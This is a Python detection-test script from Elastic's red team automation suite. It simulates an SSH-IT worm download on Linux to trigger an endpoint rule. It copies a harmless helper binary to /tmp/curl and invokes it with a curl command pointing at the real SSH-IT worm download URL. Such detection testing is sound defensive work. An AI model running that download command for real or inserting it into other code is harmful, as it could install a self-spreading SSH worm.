# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging
import sys

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)

@register_code_rta(
    id="3ad5efdc-c186-4dbd-b5ce-f8d1f102002c",
    name="ssh_it_worm",
    platforms=[OSType.LINUX],
    endpoint_rules=[
        RuleMetadata(id="cb351778-7329-4de9-82b5-6705f772a3af", name="Potential SSH-IT SSH Worm Downloaded"),
    ],
    siem_rules=[],
    techniques=["T1021", "T1563"],
)
def main() -> None:
    masquerade = "/tmp/curl"
    source = _common.get_resource_path("bin/linux.ditto_and_spawn")
    _common.copy_file(source, masquerade)

    # Execute command
    log.info("Launching fake curl commands to download payload")
    _ = _common.execute_command([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout_secs=5)

    # cleanup
    _common.remove_file(masquerade)


if __name__ == "__main__":
    sys.exit(main())
